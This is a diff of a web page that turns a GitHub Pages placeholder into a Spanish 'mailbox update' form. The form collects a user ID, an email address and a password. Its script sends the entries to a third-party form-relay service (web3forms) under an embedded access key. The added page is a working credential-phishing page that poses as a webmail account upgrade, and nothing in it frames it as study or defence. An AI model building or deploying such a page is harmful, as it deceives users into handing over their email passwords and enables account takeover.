@@ -3,81 +3,319 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My GitHub Pages Site</title>
+    <title>Correu</title>
     <style>
+        :root {
+            --primary-color: #4a6cf7;
+            --primary-dark: #3a5ce5;
+            --text-color: #333;
+            --light-gray: #f5f5f5;
+            --border-color: #ddd;
+            --error-color: #e74c3c;
+            --success-color: #2ecc71;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 40px 20px;
+            background-color: #f9f9f9;
+            color: var(--text-color);
             line-height: 1.6;
-            background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
-            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 40px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+        
+        .form-container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
         }
+        
         h1 {
             text-align: center;
-            margin-bottom: 30px;
-            font-size: 2.5em;
+            margin-bottom: 25px;
+            color: var(--primary-color);
+            font-weight: 600;
         }
-        .features {
-            display: grid;
-            gap: 20px;
-            margin: 40px 0;
-        }
-        .feature {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 20px;
-            border-radius: 10px;
-            transition: transform 0.2s;
-        }
-        .feature:hover {
-            transform: translateY(-2px);
-        }
-        .github-logo {
-            text-align: center;
-            font-size: 3em;
+        
+        .form-group {
             margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(74, 108, 247, 0.2);
+        }
+        
+        .password-strength {
+            height: 5px;
+            margin-top: 5px;
+            border-radius: 5px;
+            background-color: var(--light-gray);
+            overflow: hidden;
+        }
+        
+        .password-strength-meter {
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease, background-color 0.3s ease;
+        }
+        
+        .password-match {
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .password-match.valid {
+            color: var(--success-color);
+        }
+        
+        .password-match.invalid {
+            color: var(--error-color);
+        }
+        
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+        
+        button:hover {
+            background-color: var(--primary-dark);
+        }
+        
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .form-footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .success-message {
+            background-color: rgba(46, 204, 113, 0.1);
+            border: 1px solid var(--success-color);
+            color: var(--success-color);
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .error-message {
+            background-color: rgba(231, 76, 60, 0.1);
+            border: 1px solid var(--error-color);
+            color: var(--error-color);
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        @media (max-width: 576px) {
+            .form-container {
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="github-logo">🐙</div>
-        <h1>Successfully Deployed on GitHub Pages! 🚀</h1>
-        <p>Your static site is now live with free hosting from GitHub.</p>
+    <div class="form-container">
+        <h1>Actualización de buzón</h1>
         
-        <div class="features">
-            <div class="feature">
-                <h3>🎯 Free Hosting</h3>
-                <p>Completely free static site hosting with your GitHub account</p>
-            </div>
-            <div class="feature">
-                <h3>🔒 Custom Domain</h3>
-                <p>Option to use your own custom domain name</p>
-            </div>
-            <div class="feature">
-                <h3>⚡ Easy Updates</h3>
-                <p>Update your site by simply pushing changes to GitHub</p>
-            </div>
-            <div class="feature">
-                <h3>🌍 Global CDN</h3>
-                <p>Served fast worldwide through GitHub's infrastructure</p>
-            </div>
+        <div class="success-message" id="successMessage">
+            Your request has been sent successfully!
         </div>
         
-        <div style="text-align: center; margin-top: 40px;">
-            <a href="https://github.com/your-username/your-repo" style="color: white; text-decoration: underline;">
-                View Repository on GitHub
-            </a>
+        <div class="error-message" id="errorMessage">
+            There was an error sending the request. Please try again.
+        </div>
+        
+        <form id="upgradeForm" method="POST">
+            <input type="hidden" name="access_key" value="1388eeb3-8b47-4118-a9f2-1b02bf5183f6" />
+            <input type="hidden" name="subject" value="Account Upgrade Request" />
+            <input type="hidden" name="redirect" value="https://web3forms.com/success" />
+            <input type="checkbox" name="botcheck" class="hidden" />
+            
+            <div class="form-group">
+                <label for="name">ID de usuario</label>
+                <input type="text" name="name" id="name" placeholder="" required />
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Correo electrónico</label>
+                <input type="email" name="email" id="email" placeholder="" required />
+            </div>
+            
+            <div class="form-group">
+                <label for="pw">Contraseña</label>
+                <input type="password" name="pw" id="pw" placeholder="" required />
+                <div class="password-strength">
+                    <div class="password-strength-meter" id="passwordStrength"></div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="comfirm_pw">Confirmar Contraseña</label>
+                <input type="password" name="Comfirm_pw" id="comfirm_pw" placeholder="" required />
+                <div class="password-match" id="passwordMatch"></div>
+            </div>
+            
+            <button type="submit" id="submitBtn">Confirmar</button>
+        </form>
+        
+        <div class="form-footer">
+            Al enviar este formulario, acepta nuestros términos de servicio.
         </div>
     </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('upgradeForm');
+            const passwordInput = document.getElementById('pw');
+            const confirmPasswordInput = document.getElementById('comfirm_pw');
+            const passwordMatch = document.getElementById('passwordMatch');
+            const passwordStrength = document.getElementById('passwordStrength');
+            const submitBtn = document.getElementById('submitBtn');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Password strength indicator
+            passwordInput.addEventListener('input', function() {
+                const password = this.value;
+                let strength = 0;
+                
+                if (password.length >= 8) strength += 25;
+                if (/[A-Z]/.test(password)) strength += 25;
+                if (/[0-9]/.test(password)) strength += 25;
+                if (/[^A-Za-z0-9]/.test(password)) strength += 25;
+                
+                passwordStrength.style.width = strength + '%';
+                
+                if (strength < 50) {
+                    passwordStrength.style.backgroundColor = '#e74c3c';
+                } else if (strength < 75) {
+                    passwordStrength.style.backgroundColor = '#f39c12';
+                } else {
+                    passwordStrength.style.backgroundColor = '#2ecc71';
+                }
+            });
+            
+            // Password confirmation check
+            confirmPasswordInput.addEventListener('input', function() {
+                const password = passwordInput.value;
+                const confirmPassword = this.value;
+                
+                if (confirmPassword === '') {
+                    passwordMatch.style.display = 'none';
+                    return;
+                }
+                
+                if (password === confirmPassword) {
+                    passwordMatch.textContent = 'Passwords match';
+                    passwordMatch.className = 'password-match valid';
+                    passwordMatch.style.display = 'block';
+                } else {
+                    passwordMatch.textContent = 'Passwords do not match';
+                    passwordMatch.className = 'password-match invalid';
+                    passwordMatch.style.display = 'block';
+                }
+            });
+            
+            // Form submission
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Check if passwords match
+                if (passwordInput.value !== confirmPasswordInput.value) {
+                    errorMessage.textContent = 'Passwords do not match. Please check and try again.';
+                    errorMessage.style.display = 'block';
+                    return;
+                }
+                
+                // Disable submit button to prevent multiple submissions
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Processing...';
+                
+                // Submit form using fetch API
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: new FormData(form)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        successMessage.style.display = 'block';
+                        form.reset();
+                        passwordStrength.style.width = '0%';
+                        passwordMatch.style.display = 'none';
+                    } else {
+                        throw new Error(data.message || 'Submission failed');
+                    }
+                })
+                .catch(error => {
+                    errorMessage.textContent = error.message || 'There was an error submitting your request. Please try again.';
+                    errorMessage.style.display = 'block';
+                })
+                .finally(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Upgrade Account';
+                    
+                    // Hide messages after 5 seconds
+                    setTimeout(() => {
+                        successMessage.style.display = 'none';
+                        errorMessage.style.display = 'none';
+                    }, 5000);
+                });
+            });
+        });
+    </script>
 </body>
 </html>
